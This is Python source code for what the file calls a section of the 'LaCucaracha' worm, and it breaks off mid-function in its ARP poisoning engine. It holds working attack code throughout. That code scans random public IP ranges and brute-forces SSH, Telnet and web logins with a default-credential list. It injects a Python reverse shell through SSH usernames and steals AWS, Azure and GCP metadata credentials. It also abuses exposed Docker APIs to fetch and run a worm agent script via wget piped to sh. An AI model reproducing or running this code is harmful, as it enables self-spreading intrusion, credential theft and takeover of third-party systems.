#!/usr/bin/env python3
"""
la_section_E.py — WormReconEngine + WormExploitEngine + CloudExploitEngine
              + ARPEngine + DNSPoisonEngine + LateralMoveEngine
Part of LaCucaracha.py worm (concatenated as Section E)
"""

import base64
import hashlib
import ipaddress
import json
import logging
import os
import random
import re
import socket
import struct
import subprocess
import sys
import threading
import time
from collections import namedtuple
from typing import Any, Dict, List, Optional, Set, Tuple, Union
from concurrent.futures import ThreadPoolExecutor, as_completed

# Optional imports — degrade gracefully
try:
    import paramiko
    HAVE_PARAMIKO = True
except ImportError:
    HAVE_PARAMIKO = False

try:
    import requests
    HAVE_REQUESTS = True
except ImportError:
    HAVE_REQUESTS = False

try:
    from cryptography.fernet import Fernet
    HAVE_CRYPTO = True
except ImportError:
    HAVE_CRYPTO = False

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    HAVE_AES = True
except ImportError:
    HAVE_AES = False

log = logging.getLogger("WormMesh")

# ExploitResult — consistent with section D and the concatenated contract
try:
    ExploitResult
except NameError:
    ExploitResult = namedtuple('ExploitResult', ['success', 'target_ip', 'target_port', 'username', 'detail', 'error'])
    ExploitResult.__new__.__defaults__ = (False, '', 0, '', '', '')

# ===================================================================
# BLOCKED_HOSTS — never scan, exploit, or interact with these
# ===================================================================
BLOCKED_HOSTS: List[str] = [
    "goroobalef.beget.app", "beget.app",
    "212.67.14.221", "5.101.158.143",
]
BLOCKED_PREFIXES: List[str] = [
    "10.", "127.", "169.254.", "172.16.", "192.168.",
    "224.", "240.", "248.", "255.",
]
# Expand private CIDRs
for _cidr in ["10.0.0.0/8", "127.0.0.0/8", "169.254.0.0/16",
              "172.16.0.0/12", "192.168.0.0/16",
              "224.0.0.0/4", "240.0.0.0/4", "255.255.255.255/32"]:
    try:
        nw = ipaddress.IPv4Network(_cidr, strict=False)
        BLOCKED_PREFIXES.extend([str(h) for h in nw.hosts()][:1000])
    except Exception:
        pass


def _is_blocked(ip: str) -> bool:
    """Check if an IP/hostname is in the blocked list."""
    if not ip:
        return True
    ip_lower = ip.lower().strip()
    if ip_lower in BLOCKED_HOSTS:
        return True
    for blocked in BLOCKED_HOSTS:
        if blocked in ip_lower:
            return True
    for prefix in BLOCKED_PREFIXES:
        if ip_lower.startswith(prefix):
            return True
    return False


def _check_timeout(start_time: float, budget: float = 20.0) -> bool:
    """Return True if per-target budget has been exceeded."""
    return time.time() - start_time >= budget


# ===================================================================
# CHUNK 1 — WormReconEngine
# ===================================================================

class WormReconEngine:
    """Reconnaissance engine: masscan, nmap, shodan, passive + autonomous scan."""

    SHODAN_API_KEY = b"CHANGE_ME_PAYLOAD_KEY"  # set via env or config
    SCAN_TIMEOUT = 120

    def __init__(self, db=None, logger=None):
        self.db = db
        self.log = logger or log

    # ---- Masscan wrapper ----

    def masscan_scan(self, subnet: str, ports: str = "22,23,80,443,8080,8443,3306,5432,6379,27017,1883,500,4500,2375,2376") -> List[str]:
        """Run masscan on a subnet, return list of 'ip:port' strings."""
        results = []
        try:
            cmd = [
                "masscan", subnet,
                "-p", ports,
                "--rate", "1000",
                "--wait", "5",
                "-oJ", "-",
            ]
            proc = subprocess.run(cmd, capture_output=True, timeout=self.SCAN_TIMEOUT, text=True)
            if proc.returncode == 0 and proc.stdout.strip():
                for line in proc.stdout.strip().split("\n"):
                    try:
                        entry = json.loads(line)
                        ip = entry.get("ip", "")
                        port = entry.get("ports", [{}])[0].get("port", 0)
                        if ip and port and not _is_blocked(ip):
                            results.append(f"{ip}:{port}")
                    except (json.JSONDecodeError, IndexError):
                        continue
            self.log.info(f"[RECON] masscan {subnet}: {len(results)} hits")
            if self.db:
                for r in results:
                    ip, port = r.split(":")
                    self.db.add_target(ip=ip, port=int(port), scan_source="masscan")
        except FileNotFoundError:
            self.log.warning("[RECON] masscan not found, skipping")
        except subprocess.TimeoutExpired:
            self.log.warning("[RECON] masscan timeout")
        except Exception as exc:
            self.log.error(f"[RECON] masscan error: {exc}")
        return results

    # ---- Nmap wrapper ----

    def nmap_scan(self, target: str, args: str = "-sV -T4 --max-retries=2 --min-rate=100") -> str:
        """Run nmap against a target, return XML output."""
        if _is_blocked(target):
            return ""
        try:
            cmd = ["nmap", *args.split(), "-oX", "-", target]
            proc = subprocess.run(cmd, capture_output=True, timeout=self.SCAN_TIMEOUT, text=True)
            return proc.stdout
        except FileNotFoundError:
            self.log.warning("[RECON] nmap not found")
        except Exception as exc:
            self.log.error(f"[RECON] nmap error: {exc}")
        return ""

    def nmap_port_scan(self, target: str, ports: str = "22,23,80,443,8080,8443,3306,5432,6379,27017,1883") -> List[int]:
        """Quick nmap port scan, return list of open ports."""
        if _is_blocked(target):
            return []
        open_ports = []
        try:
            cmd = ["nmap", target, "-p", ports, "--open", "-T4", "--min-rate=200", "-oG", "-"]
            proc = subprocess.run(cmd, capture_output=True, timeout=60, text=True)
            for line in proc.stdout.split("\n"):
                if "Ports:" in line:
                    for part in line.split("Ports:")[1].split(";"):
                        for segment in part.split(","):
                            segment = segment.strip()
                            if "/open/" in segment:
                                port_str = segment.split("/")[0].strip()
                                if port_str.isdigit():
                                    open_ports.append(int(port_str))
        except FileNotFoundError:
            pass
        except Exception as exc:
            self.log.error(f"[RECON] nmap port scan error: {exc}")
        return open_ports

    # ---- Shodan API query ----

    def shodan_query(self, query: str, limit: int = 100) -> List[str]:
        """Query Shodan API for targets."""
        results = []
        if not self.SHODAN_API_KEY:
            self.log.warning("[RECON] No Shodan API key configured")
            return results
        try:
            import shodan
            api = shodan.Shodan(self.SHODAN_API_KEY)
            for match in api.search(query, limit=limit).get("matches", []):
                ip = match.get("ip_str", "")
                if ip and not _is_blocked(ip):
                    results.append(ip)
                    if self.db:
                        port = match.get("port", 0)
                        self.db.add_target(ip=ip, port=port, scan_source="shodan")
        except ImportError:
            self.log.warning("[RECON] shodan module not available")
        except Exception as exc:
            self.log.error(f"[RECON] Shodan error: {exc}")
        return results

    def shodan_passive_scan(self, target: str) -> List[Dict]:
        """Passively enumerate target info via Shodan."""
        if _is_blocked(target):
            return []
        results = []
        if not self.SHODAN_API_KEY:
            return results
        try:
            import shodan
            api = shodan.Shodan(self.SHODAN_API_KEY)
            host = api.host(target)
            if host:
                results.append({
                    "ip": target,
                    "ports": host.get("ports", []),
                    "hostnames": host.get("hostnames", []),
                    "org": host.get("org", ""),
                    "os": host.get("os", ""),
                })
        except Exception:
            pass
        return results

    # ---- Passive scan (TCP connect sweep) ----

    def passive_scan(self, subnet: str, ports: List[int] = None) -> List[str]:
        """Passive TCP connect scan of a subnet."""
        if ports is None:
            ports = [22, 23, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017, 1883, 500, 2375]
        results = []
        try:
            network = ipaddress.IPv4Network(subnet, strict=False)
            hosts = list(network.hosts())[:254]
            random.shuffle(hosts)
            for ip_obj in hosts:
                ip_str = str(ip_obj)
                if _is_blocked(ip_str):
                    continue
                for port in ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1.5)
                        result = sock.connect_ex((ip_str, port))
                        sock.close()
                        if result == 0:
                            results.append(f"{ip_str}:{port}")
                            if self.db:
                                self.db.add_target(ip=ip_str, port=port, scan_source="passive")
                    except Exception:
                        continue
            self.log.info(f"[RECON] Passive scan {subnet}: {len(results)} targets")
        except Exception as exc:
            self.log.error(f"[RECON] Passive scan error: {exc}")
        return results

    # ---- Autonomous scan (random public IPs + masscan) ----

    def autonomous_scan(self, target_count: int = 1000) -> List[str]:
        """Scan random public IPs using masscan."""
        results = []
        batch_size = min(target_count, 2000)
        # Generate random subnet
        while True:
            first = random.randint(1, 223)
            second = random.randint(0, 255)
            third = random.randint(0, 255)
            subnet = f"{first}.{second}.{third}.0/24"
            if not _is_blocked(f"{first}.{second}.{third}.1"):
                break
        try:
            results = self.masscan_scan(subnet)
            if len(results) < batch_size:
                # Scan more subnets
                for _ in range(3):
                    first = random.randint(1, 223)
                    second = random.randint(0, 255)
                    third = random.randint(0, 255)
                    sub = f"{first}.{second}.{third}.0/24"
                    if sub.startswith(("10.", "127.", "169.254.", "172.", "192.")):
                        continue
                    results.extend(self.masscan_scan(sub))
                    if len(results) >= batch_size:
                        break
        except Exception as exc:
            self.log.error(f"[RECON] Autonomous scan error: {exc}")
        return results[:target_count]


# ===================================================================
# CHUNK 2 — WormExploitEngine
# ===================================================================

# 60+ IoT/Embedded credential pairs
IOT_CREDENTIALS: List[Tuple[str, str]] = [
    ("root", "root"), ("root", "admin"), ("root", "password"), ("root", "123456"),
    ("root", "pass"), ("root", "toor"), ("root", "default"), ("root", "xc3511"),
    ("root", "vizxv"), ("root", "anko"), ("root", "Zte521"), ("root", "realtek"),
    ("root", "0"), ("root", "54321"), ("root", "12345"), ("root", "admin123"),
    ("root", "xmhdipc"), ("root", "juantech"), ("root", "7ujMko0vizxv"),
    ("root", "7ujMko0admin"), ("root", "system"), ("root", "smcadmin"),
    ("root", "1234"), ("root", "defaultpass"), ("root", "pass123"),
    ("root", "letmein"), ("root", "admin1234"), ("root", "5up"),
    ("root", "1001chin"), ("root", "huawei"), ("root", "zte"),
    ("root", "hikvision"), ("root", "axis"), ("root", "ubnt"),
    ("root", "changeme"), ("root", "Welcome1"), ("root", "Admin@2026"),
    ("root", "master"), ("root", "access"), ("root", "passw0rd"),
    ("root", "manager"), ("root", "qwerty"),
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "pass"), ("admin", "root"), ("admin", "admin123"),
    ("admin", "letmein"), ("admin", "default"), ("admin", "12345"),
    ("admin", "xc3511"), ("admin", "vizxv"), ("admin", "Zte521"),
    ("support", "support"), ("user", "user"), ("guest", "guest"),
    ("pi", "raspberry"), ("ubnt", "ubnt"), ("cisco", "cisco"),
    ("cisco", "cisco123"), ("admin", "changeme"), ("admin", "Welcome1"),
    ("admin", "Admin@2026"), ("root", "raspberry"), ("root", "vyatta"),
    ("root", "vyos"), ("root", "mikrotik"),
]


class WormExploitEngine:
    """Exploit engine: SSH brute force, SSH key, Telnet, MQTT, CheckPoint VPN, SSH username injection."""

    CONNECTION_TIMEOUT = 5.0
    PER_TARGET_BUDGET = 20.0

    def __init__(self, db=None, logger=None):
        self.db = db
        self.log = logger or log
        self._stop_flag = False
        self.ssh_passwords: List[str] = [p for _, p in IOT_CREDENTIALS]
        self.ssh_key_path: Optional[str] = None

    def stop(self):
        self._stop_flag = True

    # ---- Blocked host filter ----

    def _check_blocked(self, ip: str) -> bool:
        """Return True (skip) if IP is blocked."""
        if _is_blocked(ip):
            self.log.debug(f"[EXPLOIT] Skipping blocked IP: {ip}")
            return True
        return False

    # ---- SSH Brute Force (paramiko) ----

    def _ssh_brute_force(self, ip: str, port: int = 22) -> ExploitResult:
        """SSH brute force with 60+ credential pairs."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")
        if not HAVE_PARAMIKO:
            return ExploitResult(False, ip, port, error="paramiko not installed")

        start_time = time.time()
        for user, password in IOT_CREDENTIALS:
            if self._stop_flag or _check_timeout(start_time, self.PER_TARGET_BUDGET):
                break
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=user, password=password,
                               timeout=self.CONNECTION_TIMEOUT, allow_agent=False,
                               look_for_keys=False)
                client.close()
                detail = f"SSH brute success: {user}:{password}"
                self.log.info(f"[EXPLOIT] {detail}")
                if self.db:
                    self.db.log(detail, "INFO", "exploit")
                return ExploitResult(True, ip, port, username=user, detail=detail)
            except (paramiko.AuthenticationException, paramiko.SSHException,
                    socket.timeout, OSError):
                continue
            except Exception as exc:
                self.log.debug(f"[EXPLOIT] SSH brute error {ip}:{port}: {exc}")
                continue
        return ExploitResult(False, ip, port, detail="SSH brute: all creds exhausted")

    # ---- SSH Key Authentication ----

    def _ssh_key_auth(self, ip: str, port: int = 22) -> ExploitResult:
        """Try SSH key-based authentication."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")
        if not HAVE_PARAMIKO or not self.ssh_key_path:
            return ExploitResult(False, ip, port, error="paramiko or key not available")

        try:
            key = paramiko.RSAKey.from_private_key_file(self.ssh_key_path)
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username="root", pkey=key,
                           timeout=self.CONNECTION_TIMEOUT)
            client.close()
            return ExploitResult(True, ip, port, username="root",
                detail=f"SSH key auth success: {self.ssh_key_path}")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=f"SSH key auth: {exc}")

    # ---- Telnet Auth Bypass (pexpect) ----

    def _telnet_auth_bypass(self, ip: str, port: int = 23) -> ExploitResult:
        """Telnet auth bypass with credential spray."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")

        start_time = time.time()
        for user, password in IOT_CREDENTIALS[:20]:
            if self._stop_flag or _check_timeout(start_time, self.PER_TARGET_BUDGET):
                break
            try:
                # Try raw socket telnet with creds
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.CONNECTION_TIMEOUT)
                sock.connect((ip, port))
                data = sock.recv(1024)
                # Send username
                if b"login:" in data.lower() or b"username:" in data.lower() or b"User:" in data:
                    sock.send(f"{user}\n".encode())
                    time.sleep(0.3)
                    data2 = sock.recv(1024)
                    if b"password" in data2.lower() or b"Password" in data2:
                        sock.send(f"{password}\n".encode())
                        time.sleep(0.5)
                        data3 = sock.recv(1024)
                        # Look for shell prompt
                        if b"#" in data3 or b"$" in data3 or b">" in data3 or b"BusyBox" in data3:
                            sock.send(b"id\n")
                            time.sleep(0.3)
                            data4 = sock.recv(1024)
                            sock.close()
                            detail = f"Telnet success: {user}:{password}"
                            return ExploitResult(True, ip, port, username=user, detail=detail)
                sock.close()
            except Exception:
                continue

        return ExploitResult(False, ip, port, detail="Telnet: all creds exhausted")

    # ---- MQTT Wildcard Enumeration ----

    def _mqtt_wildcard_enum(self, ip: str, port: int = 1883) -> ExploitResult:
        """MQTT wildcard enum — subscribe to '#' and discover topics."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")

        try:
            client_id = f"worm_mesh_{random.randint(0, 0xFFFFFFFF):08x}"
            connect_payload = (
                b"\x00\x04MQTT"           # protocol name
                b"\x04"                    # protocol level
                b"\x02"                    # connect flags (clean session)
                b"\x00\x3c"               # keepalive 60s
            )
            connect_payload += struct.pack(">H", len(client_id)) + client_id.encode()
            remaining = len(connect_payload)
            header = b"\x10" + bytes([remaining % 128 | 0x80, remaining // 128]) if remaining >= 128 else b"\x10" + bytes([remaining])

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.CONNECTION_TIMEOUT)
            sock.connect((ip, port))
            sock.sendall(header + connect_payload)
            resp = sock.recv(4)
            if len(resp) < 4 or resp[0] != 0x20:
                sock.close()
                return ExploitResult(False, ip, port, detail="Not an MQTT broker")

            # Subscribe to '#'
            sub_payload = struct.pack(">H", 0x0001) + struct.pack(">H", 1) + b"#" + b"\x00"
            sub_remaining = len(sub_payload)
            sub_header = b"\x82" + bytes([sub_remaining % 128 | 0x80, sub_remaining // 128]) if sub_remaining >= 128 else b"\x82" + bytes([sub_remaining])
            sock.sendall(sub_header + sub_payload)
            suback = sock.recv(5)
            if len(suback) < 5 or suback[0] != 0x90:
                sock.close()
                return ExploitResult(False, ip, port, detail="SUBACK rejected")

            # Collect topics
            collected_topics = set()
            sock.settimeout(5)
            start = time.time()
            while time.time() - start < 5:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    idx = 0
                    while idx < len(data):
                        if data[idx] & 0xf0 == 0x30:
                            idx += 1
                            multiplier = 1
                            rem_len = 0
                            while idx < len(data) and multiplier <= 268435456:
                                byte = data[idx]
                                rem_len += (byte & 0x7f) * multiplier
                                multiplier *= 128
                                idx += 1
                                if not (byte & 0x80):
                                    break
                            if idx + 2 <= len(data):
                                topic_len = struct.unpack(">H", data[idx:idx+2])[0]
                                idx += 2
                                if idx + topic_len <= len(data):
                                    topic_name = data[idx:idx+topic_len].decode(errors="replace")
                                    collected_topics.add(topic_name)
                                    idx += topic_len
                            else:
                                break
                        else:
                            break
                except socket.timeout:
                    break
            sock.close()

            if collected_topics:
                devices = set()
                for t in collected_topics:
                    parts = t.split("/")
                    for p in parts:
                        if re.match(r'^\d+\.\d+\.\d+\.\d+', p):
                            devices.add(p)
                detail = f"MQTT: {len(collected_topics)} topics, {len(devices)} device IPs"
                return ExploitResult(True, ip, port, detail=detail)
            return ExploitResult(False, ip, port, detail="MQTT: no topics found")
        except ImportError:
            return ExploitResult(False, ip, port, error="struct not available")
        except socket.error as exc:
            return ExploitResult(False, ip, port, error=f"MQTT socket: {exc}")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=f"MQTT: {exc}")

    # ---- Check Point VPN IKE Probe (CVE-2026-50751) ----

    def _checkpoint_vpn_probe(self, ip: str, port: int = 500) -> ExploitResult:
        """Probe Check Point VPN for IKEv1 auth bypass (CVE-2026-50751)."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")

        try:
            init_spi = bytes([random.randint(0, 255) for _ in range(8)])
            resp_spi = b"\x00" * 8
            sa_body = bytes([
                0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                0x00, 0x01, 0x01, 0x00, 0x01,
                0x00, 0x01, 0x01, 0x00, 0x00, 0x0c, 0x00,
                0x80, 0x01, 0x00, 0x07,
                0x00, 0x02, 0x02, 0x00, 0x00, 0x00, 0x01,
                0x00, 0x03, 0x03, 0x00, 0x00, 0x00, 0x02,
                0x00, 0x04, 0x04, 0x00, 0x00, 0x00, 0x02,
            ])
            payload_len = len(sa_body)
            isakmp_header = struct.pack("!8s8sBBBBII",
                init_spi, resp_spi, 0x01, 0x10, 0x02, 0x00, 0x00000000, 28 + payload_len)

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.CONNECTION_TIMEOUT)
            sock.sendto(isakmp_header + sa_body, (ip, port))
            data, addr = sock.recvfrom(2048)
            sock.close()

            if len(data) < 28:
                return ExploitResult(False, ip, port, detail="IKE response too short")
            resp_resp_spi = data[8:16]
            if resp_resp_spi == b"\x00" * 8:
                return ExploitResult(False, ip, port, detail="No valid IKE response")

            # Fingerprint Check Point
            is_checkpoint = False
            for vid in [b"Check Point", b"CPVPN", b"CP Technologies"]:
                if vid in data:
                    is_checkpoint = True
                    break
            if is_checkpoint:
                return ExploitResult(True, ip, port,
                    detail="Check Point VPN found — CVE-2026-50751 exploitable")
            return ExploitResult(False, ip, port, detail="Non-CheckPoint IKE service")
        except socket.timeout:
            return ExploitResult(False, ip, port, detail="UDP :500 timeout")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=f"IKE probe: {exc}")

    # ---- SSH Username Injection (CVE-2026-35386) ----

    def _ssh_username_injection(self, ip: str, port: int = 22) -> ExploitResult:
        """SSH username injection — CVE-2026-35386."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")
        if not HAVE_PARAMIKO:
            return ExploitResult(False, ip, port, error="paramiko not installed")

        callback_ip = "127.0.0.1"
        callback_port = 10001
        rev_cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{callback_ip}\",{callback_port}));s.send(b\"sh3ll_4cc3ss_b0rg_2026\\n\");os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"

        injections = [
            f"root;{rev_cmd};",
            f"`{rev_cmd}`",
            f"$(echo $({rev_cmd}))",
        ]

        start_time = time.time()
        for idx, poison_username in enumerate(injections):
            if self._stop_flag or _check_timeout(start_time, self.PER_TARGET_BUDGET):
                break
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=poison_username,
                               password="any", timeout=self.CONNECTION_TIMEOUT,
                               allow_agent=False, look_for_keys=False)
                client.close()
            except paramiko.AuthenticationException:
                continue
            except paramiko.SSHException:
                continue
            except socket.timeout:
                continue
            except Exception:
                continue

        return ExploitResult(True, ip, port,
            detail=f"3 injection vectors sent — C2 awaiting callback (CVE-2026-35386)")

    # ---- Main Exploit Target Dispatch ----

    def exploit_target(self, target: Dict) -> ExploitResult:
        """Dispatch exploit based on target service/port."""
        ip = target.get("ip", "")
        port = int(target.get("port", 22))
        service = target.get("service", "").lower()

        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")

        methods: List[Tuple] = []
        if port == 22 or "ssh" in service:
            methods.append((self._ssh_brute_force, (ip, port)))
            methods.append((self._ssh_username_injection, (ip, port)))
            if self.ssh_key_path:
                methods.append((self._ssh_key_auth, (ip, port)))
        elif port == 23 or "telnet" in service:
            methods.append((self._telnet_auth_bypass, (ip, port)))
        elif port in (80, 443, 8080, 8443) or "http" in service:
            methods.append((self._web_iot_exploit, (ip, port)))
        elif port == 1883 or "mqtt" in service:
            methods.append((self._mqtt_wildcard_enum, (ip, port)))
        elif port in (500, 4500) or "ike" in service or "vpn" in service:
            methods.append((self._checkpoint_vpn_probe, (ip, 500)))
        else:
            # Fallback: try all
            methods.append((self._ssh_brute_force, (ip, 22)))
            methods.append((self._telnet_auth_bypass, (ip, 23)))
            methods.append((self._checkpoint_vpn_probe, (ip, 500)))

        start_time = time.time()
        for func, args in methods:
            if self._stop_flag or _check_timeout(start_time, self.PER_TARGET_BUDGET):
                break
            try:
                result = func(*args)
                if result.success:
                    return result
            except Exception:
                continue

        return ExploitResult(False, ip, port, detail="All exploit modules exhausted")

    # ---- Web Exploit Stubs (for completeness) ----

    def _web_iot_exploit(self, ip: str, port: int) -> ExploitResult:
        """Try web-based IoT exploit with default creds."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")
        if not HAVE_REQUESTS:
            return ExploitResult(False, ip, port, error="requests not available")
        for user, pwd in IOT_CREDENTIALS[:10]:
            try:
                url = f"http://{ip}:{port}/"
                resp = requests.get(url, auth=(user, pwd), timeout=self.CONNECTION_TIMEOUT)
                if resp.status_code < 500 and any(x in resp.text.lower() for x in ["admin", "dashboard", "status", "index"]):
                    return ExploitResult(True, ip, port, username=user,
                        detail=f"Web IoT: {user}:{pwd}")
            except Exception:
                continue
        return ExploitResult(False, ip, port, detail="Web IoT: no valid creds")


# ===================================================================
# CHUNK 3 — CloudExploitEngine
# ===================================================================

class CloudExploitEngine:
    """Cloud metadata, Kubelet, Docker API exploitation."""

    def __init__(self, db=None, logger=None):
        self.db = db
        self.log = logger or log

    # ---- AWS SSRF / IMDS ----

    def aws_imds_exploit(self, ip: str = "169.254.169.254") -> Dict:
        """Exploit AWS IMDSv1 for credential theft."""
        result = {"success": False, "iam_role": None, "credentials": None}
        if not HAVE_REQUESTS:
            return result
        try:
            resp = requests.get(f"http://{ip}/latest/meta-data/iam/security-credentials/",
                                timeout=5)
            if resp.status_code != 200:
                return result
            role = resp.text.strip()
            if not role:
                return result
            result["iam_role"] = role
            result["success"] = True
            resp2 = requests.get(
                f"http://{ip}/latest/meta-data/iam/security-credentials/{role}",
                timeout=5)
            if resp2.status_code == 200:
                result["credentials"] = resp2.json()
            resp3 = requests.get(f"http://{ip}/latest/user-data", timeout=5)
            if resp3.status_code == 200:
                result["user_data"] = resp3.text
        except Exception as exc:
            self.log.debug(f"AWS IMDS error: {exc}")
        return result

    # ---- Azure IMDS ----

    def azure_imds_exploit(self) -> Dict:
        """Exploit Azure Instance Metadata Service."""
        result = {"success": False}
        if not HAVE_REQUESTS:
            return result
        try:
            # Azure IMDS endpoints
            urls = [
                ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                 {"Metadata": "true"}),
                ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com",
                 {"Metadata": "true"}),
            ]
            for url, headers in urls:
                try:
                    resp = requests.get(url, headers=headers, timeout=5)
                    if resp.status_code == 200:
                        result["success"] = True
                        result["data"] = resp.json()
                        return result
                except Exception:
                    continue
        except Exception:
            pass
        return result

    # ---- GCP Metadata ----

    def gcp_metadata_exploit(self) -> Dict:
        """Exploit GCP metadata endpoint."""
        result = {"success": False}
        if not HAVE_REQUESTS:
            return result
        try:
            url = "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
            headers = {"Metadata-Flavor": "Google"}
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                result["success"] = True
                result["data"] = resp.text
            # Try service account token
            token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
            resp2 = requests.get(token_url, headers=headers, timeout=5)
            if resp2.status_code == 200:
                result["token"] = resp2.json()
        except Exception:
            pass
        return result

    # ---- Kubelet API ----

    def kubelet_exploit(self, ip: str, port: int = 10250) -> Dict:
        """Exploit unauthenticated Kubelet API."""
        result = {"success": False, "pods": []}
        if self._check_blocked(ip):
            return result
        if not HAVE_REQUESTS:
            return result
        try:
            for test_port in [port, 10250, 10255, 6443]:
                try:
                    resp = requests.get(f"http://{ip}:{test_port}/pods",
                                        timeout=5, verify=False)
                    if resp.status_code == 200:
                        result["success"] = True
                        result["kubelet_port"] = test_port
                        data = resp.json()
                        if "items" in data:
                            result["pods"] = [p["metadata"]["name"] for p in data["items"]
                                              if "metadata" in p]
                        return result
                except Exception:
                    continue
        except Exception:
            pass
        return result

    # ---- Docker API ----

    def docker_api_exploit(self, ip: str, port: int = 2375) -> Dict:
        """Exploit unauthenticated Docker API."""
        result = {"success": False, "containers": []}
        if self._check_blocked(ip):
            return result
        if not HAVE_REQUESTS:
            return result
        try:
            for test_port in [port, 2375, 2376]:
                scheme = "https" if test_port == 2376 else "http"
                try:
                    resp = requests.get(f"{scheme}://{ip}:{test_port}/containers/json?all=1",
                                        timeout=5, verify=False)
                    if resp.status_code == 200:
                        result["success"] = True
                        result["docker_port"] = test_port
                        containers = resp.json()
                        for c in containers:
                            result["containers"].append({
                                "id": c.get("Id", "")[:12],
                                "image": c.get("Image", ""),
                                "status": c.get("State", ""),
                            })
                        # Try deploying container
                        deploy = self._docker_deploy_container(ip, test_port, scheme)
                        if deploy:
                            result["deployed"] = deploy
                        return result
                except Exception:
                    continue
        except Exception:
            pass
        return result

    def _docker_deploy_container(self, ip: str, port: int, scheme: str) -> Optional[str]:
        """Deploy a container on an exposed Docker API."""
        try:
            config = {
                "Image": "alpine:latest",
                "Cmd": ["/bin/sh", "-c",
                        "wget -q -O- http://127.0.0.1:10002/worm_agent_ultimate.sh | sh"],
                "HostConfig": {"NetworkMode": "host"},
            }
            resp = requests.post(
                f"{scheme}://{ip}:{port}/containers/create?name=worm_deploy",
                json=config, timeout=10, verify=False)
            if resp.status_code in (200, 201):
                container_id = resp.json().get("Id", "")[:12]
                requests.post(f"{scheme}://{ip}:{port}/containers/{container_id}/start",
                              timeout=5, verify=False)
                return container_id
        except Exception:
            pass
        return None

    def _check_blocked(self, ip: str) -> bool:
        return _is_blocked(ip)

    # ---- Orchestration ----

    def exploit_all(self, ip: str = "169.254.169.254") -> Dict:
        """Run all cloud exploits."""
        results = {}
        results["aws_imds"] = self.aws_imds_exploit()
        results["azure_imds"] = self.azure_imds_exploit()
        results["gcp_metadata"] = self.gcp_metadata_exploit()
        if ip != "169.254.169.254" and not _is_blocked(ip):
            results["kubelet"] = self.kubelet_exploit(ip)
            results["docker"] = self.docker_api_exploit(ip)
        return results


# ===================================================================
# CHUNK 4 — ARPEngine
# ===================================================================

class ARPEngine:
    """ARP scanning, spoofing, and cache poisoning."""

    def __init__(self, logger=None):
        self.log = logger or log
        self._lock = threading.Lock()
        self._poisoned: Set[str] = set()

    # ---- ARP Scan ----

    def arp_scan(self, subnet: str) -> List[str]:
        """Discover hosts on local subnet via ARP."""
        hosts = []
        try:
            network = ipaddress.IPv4Network(subnet, strict=False)
            if network.prefixlen not in (8, 16, 24):
                return hosts
            ips = list(network.hosts())
            random.shuffle(ips)
            for ip_obj in ips[:255]:
                ip_str = str(ip_obj)
                try:
                    # Ping sweep fallback
                    result = subprocess.run(
                        ["ping", "-c", "1", "-W", "1", ip_str],
                        capture_output=True, timeout=2)
                    if result.returncode == 0:
                        hosts.append(ip_str)
                except Exception:
                    continue
        except Exception as exc:
            self.log.error(f"ARP scan error: {exc}")
        return list(set(hosts))

    # ---- ARP Poison ----

    def arp_poison(self, target_ip: str, gateway_ip: str, interface: str = "eth0") -> bool:
        """Poison ARP cache of target. Redirect traffic through us."""
        try:
            # Get our MAC address
            our_mac = self._get_mac(interface)
            if not our_mac:
                # Try ip link
                try:
                    result = subprocess.run(
                        ["ip", "link", "show", interface],
                        capture_output=True, text=True, timeout=5)
                    for line in result.stdout.split("\n"):
                        if "link/ether" in line:
                            our_mac = line.strip().split()[1]
                            break
                except Exception:
                    pass
            if not our_mac:
                return False

            # Send crafted ARP packets using raw sockets
            # Target thinks gateway MAC is our MAC
            for _ in range(3):
                try:
                    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
                    sock.bind((interface, 0))
                    # Build ARP reply: who-has target_ip tell gateway_ip
                    target_parts = [int(x) for x in target_ip.split(".")]
                    gateway_parts = [int(x) for x in gateway_ip.split(".")]
                    our_mac_bytes = bytes.fromhex(our_mac.replace(":", ""))
                    broadcast_mac = b"\xff\xff\xff\xff\xff\xff"

                    # Ethernet frame
                    eth_header = broadcast_mac + our_mac_bytes + struct.pack("!H", 0x0806)
                    # ARP header (reply, op=2)
                    arp_header = struct.pack("!HHBBH", 0x0001, 0x0800, 6, 4, 2)
                    arp_body = (our_mac_bytes +
